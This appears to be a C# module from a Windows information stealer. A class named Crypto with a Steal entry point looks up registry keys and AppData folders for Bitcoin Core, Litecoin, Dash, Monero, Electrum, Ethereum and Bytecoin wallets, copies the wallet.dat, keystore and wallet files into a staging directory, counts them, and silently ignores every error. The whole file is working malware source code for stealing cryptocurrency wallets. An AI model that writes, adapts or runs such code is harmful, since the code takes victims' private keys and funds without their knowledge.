namespace NoFile
{
    using Microsoft.Win32;
    using System;
    using System.IO;

    internal class Crypto
    {
        public static int count;

        public static void BCN(string directorypath)
        {
            try
            {
                foreach (FileInfo info in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\bytecoin").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + @"\Bytecoin\");
                    if (info.Extension.Equals(".wallet"))
                    {
                        info.CopyTo(directorypath + @"\Bytecoin\" + info.Name);
                        count++;
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        public static void BitcoinCore(string directorypath)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + @"\BitcoinCore\");
                        File.Copy(key.GetValue("strDataDir").ToString() + @"\wallet.dat", directorypath + @"\BitcoinCore\wallet.dat");
                        count++;
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        public static void DSH(string directorypath)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + @"\DashCore\");
                        File.Copy(key.GetValue("strDataDir").ToString() + @"\wallet.dat", directorypath + @"\DashCore\wallet.dat");
                        count++;
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        public static void Electrum(string directorypath)
        {
            try
            {
                foreach (FileInfo info in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Electrum\wallets").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + @"\Electrum\");
                    info.CopyTo(directorypath + @"\Electrum\" + info.Name);
                    count++;
                }
            }
            catch (Exception)
            {
            }
        }

        public static void ETH(string directorypath)
        {
            try
            {
                foreach (FileInfo info in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Ethereum\keystore").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + @"\Ethereum\");
                    info.CopyTo(directorypath + @"\Ethereum\" + info.Name);
                    count++;
                }
            }
            catch (Exception)
            {
            }
        }

        public static void LTC(string directorypath)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + @"\LitecoinCore\");
                        File.Copy(key.GetValue("strDataDir").ToString() + @"\wallet.dat", directorypath + @"\LitecoinCore\wallet.dat");
                        count++;
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        public static int Steal(string cryptoDir)
        {
            BCN(cryptoDir);
            BitcoinCore(cryptoDir);
            DSH(cryptoDir);
            Electrum(cryptoDir);
            ETH(cryptoDir);
            LTC(cryptoDir);
            XMR(cryptoDir);
            ZEC(cryptoDir);
            return count;
        }

        public static void XMR(string directorypath)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + @"\Monero\");
                        string sourceFileName = key.GetValue("wallet_path").ToString().Replace("/", @"\");
                        Directory.CreateDirectory(directorypath + @"\Monero\");
                        char[] separator = new char[] { '\\' };
                        char[] chArray2 = new char[] { '\\' };
                        File.Copy(sourceFileName, directorypath + @"\Monero\" + sourceFileName.Split(separator)[sourceFileName.Split(chArray2).Length - 1]);
                        count++;
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        public static void ZEC(string directorypath)
        {
        }
    }
}

